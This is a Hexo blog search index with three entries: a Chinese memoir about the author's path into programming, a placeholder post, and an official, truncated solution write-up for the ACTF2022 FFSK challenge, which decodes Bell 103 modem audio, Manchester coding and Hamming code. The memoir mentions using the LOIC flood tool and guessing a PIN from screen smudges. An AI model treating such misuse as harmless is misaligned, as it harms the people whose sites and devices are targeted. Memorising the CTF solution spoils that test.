<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>晚安，紫金港</title>
      <link href="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/"/>
      <url>/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/</url>
      
        <content type="html"><![CDATA[<p>现在是2023年7月4日的凌晨两点，按照计划我应当负责7.1-7.4的晚安短信——但毕竟现在才动笔，只能是爽约了：总之十分抱歉。至于原因……我不知道。好像熬夜考完试就穿越到了轰趴，熬了个头痛的夜，再大睡一觉就到现在了。<br>不过四天并做两天的话，希望能写一些不是垃圾话的长文，大家看个开心就好。<br>那么今天我想聊聊我的从前（高中往前），想起啥就写啥好了。  </p><blockquote><p>年少时许多看似不起眼的小事，你以为简单选择的岔路口，其实多年以后张望，都会发现，不经意间，它竟然改变你往后的人生。  </p></blockquote><p>这鸡汤是真的土，可是回头看看却是真切无比。<br>好了，苯堡下面开始要figuratively亚一点（梗来源：大破进击&#x2F;小破不入渠）。  </p><h1 id="我是？"><a href="#我是？" class="headerlink" title="我是？"></a>我是？</h1><p>我是yyy，因为我的名字缩写就是yyy。<br>如果你想要看我的博客(A.K.A. 黑历史)：<br><a href="http://cnblogs.com/yyy2015c01">http://cnblogs.com/yyy2015c01</a><br><a href="http://cubicy.icu/">http://cubicy.icu</a><br>问就是没备案。  </p><h1 id="迁徙"><a href="#迁徙" class="headerlink" title="迁徙"></a>迁徙</h1><p>我来自闽东的三线小城市，但这几年因为某家电池企业的缘故，这座城市还算小有名气。<br>家长在很小的时候以不小的付出把我带到了厦门，母上从此每周往返两座城市，一头工作一头是家庭——我觉得高铁应该为她的卓越贡献发奖。<br>总之，事实证明这是无比正确的一个选择，有远见的父母们总是知道（抑或是歪打正着）大城市为孩子带来的是一个好得多的未来。  </p><h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><p>小学的时候因为“数学好”被拉去学校编程小组学PC Logo小海龟画图了。不知道大伙那边有没有呢？<br><img src="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/pclogo1.png" alt="PC Logo"><br><img src="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/pclogo2.png" alt="PC Logo2"><br>就是不知道小学的我知道长大后高考数学还没语文高会有啥想法。<br>那时候机房还是CRT显示器，进机房要穿鞋套……据说这是90后的经历？好吧，的确很早就接触了电脑。<br>好像是数学老师在某一个平常下午想起来为我引荐的？感觉人生轨迹从此被彻底改变了。<br>六年级参加了市里的比赛，运气比较好拿到了全市第一。</p><blockquote><p>得，这下彻底进坑了。——编者注<br>但是再怎么样也比练梵婀玲轻松多了，不是吗？</p></blockquote><p>顺带一提，后来初中为我提前在校训练分配的学号是按这次比赛的名次给的，名为<code>2015c01</code>，于是我把他当作荣誉称号拼进了ID里——这就是<code>yyy2015c01</code>的由来。现在看来蠢到不行。但是人不装逼活着有什么意思？  </p><h1 id="初中"><a href="#初中" class="headerlink" title="初中"></a>初中</h1><p>六年级到初中的这段时间我转而学习C++，准确的来说应该是C with STL。<br>于是每逢放学便组团冲向机房。<br>于是别人军训时我在吹空调，俨然感觉自己是人上人。<br>于是过度膨胀的自信心让我在校内评测网站上和学长打嘴炮，一举成名。<br>后来鉴于我认错态度良好，那个网站的学长许诺我认真学习便赐予<code>管理员</code>尊贵身份。<br>我选择跟随他，在皈依者狂热的驱动下用Notepad++跟着写PHP、MySQL……这或许就是我的Web启蒙？<br><del>在一机房人被题目折磨的不清时，我偶尔会滥用职权把题目数据改水了</del><br>后来，这位学长向我传教东舰L三大教（東方Project、艦隊これくしょん「艦これ」、Love Live!「ラブライブ！」），于是从此以后时常和妹子或者男同学中午翻进机房玩艦これ（这经历现在看看多少有点奇妙深刻了）。<br>这位学长的合作伙伴向我讲述MySQL注入等基础的安全知识，这或许就是我的信息安全启蒙？ </p><blockquote><p>其实可能不是。小学为了从家长手上拿到iPad密码，用橡皮擦擦屏幕留下白印，再让家长解锁观察指纹位置，然后排列组合了两次就拿到了PIN（什么社工）。</p></blockquote><p>……你知道的，每个写程序的大男孩都有个骇客梦——这些大男孩不出意外的先成了脚本小子。<br>这些东西未曾丢失过，我甚至现在就能翻出来当时玩的LOIC……虽然最正经的用途是给老师学校主页刷访问量。<br><img src="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/LOIC.png" alt="LOIC">  </p><blockquote><p>数据不丢失多亏了我从小学开始执行的数据备份3-2-1原则，虽然那时的“异地”对我来讲可能只是两个不同房间吧……  </p></blockquote><p>哦我是不是忘说了，那个网站许多OIer（自称）听过用过：就是<a href="https://www.luogu.com.cn/">洛谷</a>。从早年两个人路边发黑白传单一路做到今天的规模着实令人敬佩。  </p><h3 id="番外：老二刺螈了"><a href="#番外：老二刺螈了" class="headerlink" title="番外：老二刺螈了"></a>番外：老二刺螈了</h3><p>那时候开始在b站追番——甚至蹭的小区物业WiFi。当时A站还活着，逸帝也在位，我在几百KB&#x2F;s的网速下努力为御坂美琴刷着“你指尖跃动的电光是我此生不灭的信仰”这种比“立于浮华之世，奏响天籁之音”还中二的弹幕。<br>好吧，我还挺怀念的——当然不是指喧闹的蝉鸣与过时笔记本怼着桌面的扬声器，近热带热浪与降频工作的中央处理器。  </p><h1 id="荒废与荒诞的高中生活-amp-ZJU摸鱼记"><a href="#荒废与荒诞的高中生活-amp-ZJU摸鱼记" class="headerlink" title="荒废与荒诞的高中生活&amp;ZJU摸鱼记"></a>荒废与荒诞的高中生活&amp;ZJU摸鱼记</h1><p>累了，天也亮了。我明天会再回来的！<br>除了班里gay的恩怨情仇，炒币大失败，迫真短线交易员，杠杆中级高手，996专攻osu和雀魂的迫真算法竞赛选手外也没啥好讲的嘛！<br>不过应该还是比大部分人的高中生活离谱的多。  </p><h1 id="我是？-1"><a href="#我是？-1" class="headerlink" title="我是？"></a>我是？</h1><p>我是幸运的，在每个关键时间节点都遇到了对的人推我一把：或是开明的家长，或是授人以渔的先辈；<br>又或者我还是被宿命支配着的，这种幸运只是来自于信息差，是“随蝴蝶消逝的旧日的幻影”。<br>不过即使是后者，对我而言至多是还原论&#x2F;决定论：我始终相信自身的努力也是宿命的一部分。<br>总之我其实没变过，如果真有thoughtcrime我早该被枪毙一万次，让我更好地压制住自己的被动攻击型人格吧。<br>像这篇补交的晚安短信一样，我很惭愧时常不能回应他人的期待，所以希望日后能用自己的力量创造这种“幸运”。  </p><blockquote><p>掴んで見せます、自分星！——星見純那</p></blockquote><p>也希望所有在山区里，在高原上，处在信息茧房里的人儿能拥有看到比自己更高境界的幸运吧。<br>现在是4点44分，我时常在紫金港充满雾气而寂静的夜里胡思乱想；这次我把它写出来了而已。天亮了，我也该睡了。<br><strong>早安，紫金港。晚安，紫金港！</strong>  </p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 晚安短信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>-菫時-单推人</title>
      <link href="/2023/07/03/hello-world/"/>
      <url>/2023/07/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>这是个测试页面。<br>又是一个我的新博客^_^希望这次认真对待。<br>我是杠杠！<br><img src="/2023/07/03/hello-world/image.png" alt="Alt text"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Miao </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Foo </tag>
            
            <tag> Bar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2022 - FFSK - Official WriteUp</title>
      <link href="/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/"/>
      <url>/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="FFSK-WriteUp"><a href="#FFSK-WriteUp" class="headerlink" title="FFSK - WriteUp"></a>FFSK - WriteUp</h1><p><del>众所周知歪歪歪英文很烂求轻喷</del>  </p><h3 id="0-Intro"><a href="#0-Intro" class="headerlink" title="0. Intro"></a>0. Intro</h3><p>In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. I’m happy about their praise, but after checking their solution I think what truly “impressive” is their creativity and persistence.</p><p><strong>Strongly recommend reading their awesome solution: <a href="https://maplebacon.org/2022/06/actf-ffsk/">https://maplebacon.org/2022/06/actf-ffsk/</a></strong></p><p>FSK &#x3D; Frequency-shift keying.</p><p>FFSK &#x3D; Double FSK or Fast FSK, whatever.</p><p>This problem is designed to invite participants to have a look at <em>the principle of communication</em>. </p><h3 id="1-Description"><a href="#1-Description" class="headerlink" title="1. Description"></a>1. Description</h3><p>A journey to solve a misc problem always begins from a problem description. Here’s it:</p><blockquote><p>I’ve bought the <strong>second commercial modem</strong> for computers in a big city of the UK.</p><blockquote><p>激情澎湃的球迷迷恋这个地方。遇上球赛季，酒吧里的热情、呐喊、啤酒、摇滚，足球让这个城市充满活力和希望。<br>从三万英尺的云端望去，往日的生活成了一个遥远微小的地图。<br>阳光明媚的日子，开始出发，北京时间00:50 开始起飞，一个梦的距离，就可以到达荷兰阿姆斯特丹，短暂停留之后，然后转机飞往英国<br>南航的飞机配置完备，全程可以充电，还有wifi，影视屏有面前最新的电影。睡睡醒醒，在飞机上觅到一部《北京爱情故事》，让我在三万英尺的空中哭的稀里哗啦。</p></blockquote></blockquote><p>Just Google it, and you’ll realize what it means:</p><ul><li><p><strong>second commercial modem→Bell 103, corresponds with the file name “modem.wav”</strong></p></li><li><p>a big city in the UK: <strong>Manchester</strong>, which refers to the famous coding method.</p></li><li><p>The source of the long Chinese paragraph: <a href="https://kknews.cc/zh-hk/travel/e6yjp34.html">https://kknews.cc/zh-hk/travel/e6yjp34.html</a></p><p>  It describes a trip to Manchester, which is indeed a big city in the UK.</p></li></ul><h3 id="2-Bell-103"><a href="#2-Bell-103" class="headerlink" title="2. Bell 103"></a>2. Bell 103</h3><p>Here’s an article that shows how the Bell 103 protocol works: <a href="https://vigrey.com/blog/emulating-bell-103-modem">https://vigrey.com/blog/emulating-bell-103-modem</a></p><p>So two key points need your attention. First, characters are stored in ASCII code and are <strong>little-endian;</strong> second, it has 2 channels for communication: one for the server-side(2025&#x2F;2225 Hz), and another for the client-side(1070&#x2F;1270 Hz).</p><p>You can also find it from the spectrogram of the .wav file.</p><h3 id="2-Server-channel"><a href="#2-Server-channel" class="headerlink" title="2. Server channel"></a>2. Server channel</h3><p>Using the <code>minimodem</code>tool (See MapleBacon’s write-up) is functional.</p><p>Also, you can find some useful tools in GitHub: <a href="https://github.com/laurenschneider/audiodecoder">https://github.com/laurenschneider/audiodecoder</a></p><p>It may be a faster way. In fact, the <code>solve.py</code> is based on its code.</p><p>After all, you’ll see this on the server channel:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such</span><br><span class="line">a slow method with a high Bit Error Ratio for communication? It took me a lot of</span><br><span class="line">effort to correct bit-flips, making sure the communication was less</span><br><span class="line">error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER</span><br><span class="line">TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel</span><br><span class="line">while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is</span><br><span class="line">the new protocol? Guess by yourself!</span><br></pre></td></tr></table></figure><h3 id="3-Client-channel"><a href="#3-Client-channel" class="headerlink" title="3. Client channel"></a>3. Client channel</h3><p>We can extract the bit string on this channel using the same method but just make some tweaks of frequency. You’ll get a bit string of 53640 bits.</p><p>Notice that the bit string contains only “01” “10”, that is what <strong>Manchester is</strong> all about. The <code>IEEE 802.3</code>mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&#x2F;10 to 1&#x2F;0, but what is widely used is defined in IEEE 802.3, which says “01”→1 and “10”→0</p><p>Then the key problem is to solve Hamming code. From the given information, you’ll realize the block size is 20bits. Implement it by yourself or just Google&#x2F;GitHub&#x2F;StackOverflow it.</p><p>Find every “1” bit in a block, XOR their <strong>positions</strong>, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit. </p><p>Actually, every block has, and only has an error bit: that’s an intended design to notify you that you’re on the right way :)</p><h3 id="4-Final-Step"><a href="#4-Final-Step" class="headerlink" title="4. Final Step"></a>4. Final Step</h3><p>Now you’ve got the cipher bit string: just applied Bell 103 decoder to it once again. </p><p>It’ll yield a string that starts with <code>data:image/png;base64,</code></p><p>An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. It’s a QR Code. Scan it, and got the flag.</p><h3 id="5-Hints-Explanation"><a href="#5-Hints-Explanation" class="headerlink" title="5. Hints Explanation"></a>5. Hints Explanation</h3><ol><li><p><code>所有人都认为，吃鸡蛋前，原始的方法是打破鸡蛋较大的一端。可是当今皇帝的祖父 时候吃鸡蛋，一次按古法打鸡蛋时碰巧将一个手指弄破了，因此他的父亲，当时的皇帝， 就下了一道敕令，命令全体臣民吃鸡蛋时打破鸡蛋较小的一端，违令者重罚。 老百姓们 对这项命令极为反感。历史告诉我们，由此曾发生过六次叛乱，其中一个皇帝送了命，另 一个丢了王位…关于这一争端，曾出版过几百本大部著作，不过大端派的书一直是受禁的 ，法律也规定该派的任何人不得做官。 ——乔纳森·斯威夫特，《格列佛游记》</code></p><p> It is a quote from Gulliver’s Travels.  Fun fact: this paragraph is <strong>exactly the original source of the 2 words used in modern computer science: “big-endian” &amp; “little-endian”.</strong></p><p> This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.</p></li><li><p><code>Hamming code block size: 20bits</code></p><p> Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.</p></li><li><p><code>Bell 103</code></p><p> For those who ignored the problem description.</p></li></ol><h3 id="6-Script-to-Solve"><a href="#6-Script-to-Solve" class="headerlink" title="6. Script to Solve"></a>6. Script to Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># goertzel.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Module to create a Goertzel filter</span></span><br><span class="line"><span class="string">Original source: https://github.com/laurenschneider/audiodecoder</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Goertzel</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rate, freq</span>):</span><br><span class="line">        self.normalize = <span class="number">0</span></span><br><span class="line">        self.coeffs = <span class="number">0</span></span><br><span class="line">        self.sample_rate = rate</span><br><span class="line">        self.target_freq = freq</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculate_coeff</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Precompute coefficients needed for filter equation.</span></span><br><span class="line"><span class="string">        Coeff formulas courtesy of Prof. Massey</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        n = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">        w0 = (<span class="number">2</span> * np.pi * self.target_freq) / self.sample_rate</span><br><span class="line">        self.normalize = np.exp(<span class="number">1j</span> * w0 * n)</span><br><span class="line">        self.coeffs = np.array([np.exp((-<span class="number">1j</span>) * w0 * k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">self, samples</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Goertzel filter equation</span></span><br><span class="line"><span class="string">        :param samples: array of samples</span></span><br><span class="line"><span class="string">        :returns: amplitude</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        y = self.normalize * <span class="number">160</span> * np.dot(self.coeffs, samples)</span><br><span class="line">        ampl = np.<span class="built_in">abs</span>(y)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ampl</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decode.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Decode a wav file using a Goertzel filter.</span></span><br><span class="line"><span class="string">Modified from https://github.com/laurenschneider/audiodecoder</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> goertzel <span class="keyword">import</span> Goertzel</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> wavfile</span><br><span class="line"></span><br><span class="line">DATA = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">filepath = os.path.join(DATA, <span class="string">&quot;filename.wav&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read sample rate and data from audio file</span></span><br><span class="line">rate, data = wavfile.read(filepath)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">mark_freq = <span class="number">2225</span></span><br><span class="line">space_freq = <span class="number">2025</span></span><br><span class="line">mark_filter = Goertzel(rate, mark_freq)</span><br><span class="line">space_filter = Goertzel(rate, space_freq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate coefficients for each filter</span></span><br><span class="line">mark_filter.calculate_coeff()</span><br><span class="line">space_filter.calculate_coeff()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for each chunk of 160 samples</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">160</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        start = i - <span class="number">160</span></span><br><span class="line">        end = i</span><br><span class="line">        samples = data[start:end]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get amplitutes of sample set</span></span><br><span class="line">        mark_amp = mark_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line">        space_amp = space_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mark_amp &gt; space_amp:</span><br><span class="line">            <span class="comment"># bit is 1</span></span><br><span class="line">            to_add = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># bit is zero</span></span><br><span class="line">            to_add = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        bit_string = to_add + bit_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="built_in">len</span>(bit_string)+<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        start = x - <span class="number">9</span></span><br><span class="line">        end = x - <span class="number">1</span></span><br><span class="line">        message = <span class="built_in">chr</span>(<span class="built_in">int</span>(bit_string[start:end],<span class="number">2</span>)) + message</span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set target frequencies</span></span><br><span class="line">mark_freq = <span class="number">1270</span></span><br><span class="line">space_freq = <span class="number">1070</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create two filters</span></span><br><span class="line">mark_filter = Goertzel(rate, mark_freq)</span><br><span class="line">space_filter = Goertzel(rate, space_freq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate coefficients for each filter</span></span><br><span class="line">mark_filter.calculate_coeff()</span><br><span class="line">space_filter.calculate_coeff()</span><br><span class="line"></span><br><span class="line">bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">message = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for each chunk of 160 samples</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">160</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        start = i - <span class="number">160</span></span><br><span class="line">        end = i</span><br><span class="line">        samples = data[start:end]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get amplitutes of sample set</span></span><br><span class="line">        mark_amp = mark_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line">        space_amp = space_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mark_amp &gt; space_amp:</span><br><span class="line">            to_add = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            to_add = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        bit_string = to_add + bit_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingBolck</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(message)==<span class="number">15</span>)</span><br><span class="line">    message=message[::-<span class="number">1</span>]</span><br><span class="line">    code = <span class="number">0</span></span><br><span class="line">    m_pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (ind+<span class="number">1</span>)&amp;(ind): <span class="comment"># Not parity check bit</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(message[m_pos],<span class="number">2</span>):</span><br><span class="line">                code = code ^ (<span class="number">1</span>&lt;&lt;ind)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b1</span>)&lt;&lt;<span class="number">0</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b10</span>)&lt;&lt;<span class="number">0</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b100</span>)&lt;&lt;<span class="number">1</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b1000</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">            m_pos = m_pos + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    code = code ^ (<span class="number">1</span>&lt;&lt;random.randint(<span class="number">0</span>,<span class="number">19</span>))</span><br><span class="line"></span><br><span class="line">    retStr = <span class="string">&quot;&#123;0:020b&#125;&quot;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;from &quot;</span>+message+<span class="string">&quot; to &quot;</span>+retStr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingBolckInv</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(message)==<span class="number">20</span>)</span><br><span class="line">    code = <span class="built_in">int</span>(message,<span class="number">2</span>)</span><br><span class="line">    wrong = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span>&lt;&lt;ind)&amp;code:</span><br><span class="line">            wrong = wrong ^ (ind+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> wrong:</span><br><span class="line">        code = code ^ (<span class="number">1</span>&lt;&lt;(wrong-<span class="number">1</span>))</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (ind+<span class="number">1</span>)&amp;(ind): <span class="comment"># Not parity check bit</span></span><br><span class="line">            retStr = retStr + (<span 